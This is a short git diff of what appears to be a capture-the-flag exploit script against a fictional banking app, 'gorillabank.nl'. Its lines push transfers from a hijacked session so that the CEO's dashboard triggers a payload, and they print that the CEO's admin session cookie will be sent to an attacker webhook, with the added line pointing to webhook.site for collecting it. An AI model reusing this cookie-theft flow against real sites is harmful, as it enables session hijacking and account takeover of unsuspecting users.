@@ -88,4 +88,4 @@ def transfer(session, to_user_email, amount, memo=""):
 transfer(session_quinn, hacker_email, 1)
 transfer(hacked_session, "ceo@gorillabank.nl", 1)
 print("Now wait for the ceo to visit his dashboard, after which the webhook will receive the admin's session cookie")
-
+print("You can create your own webhook at https://webhook.site/ and replace the WEBHOOK variable above to see the cookie in your own webhook")
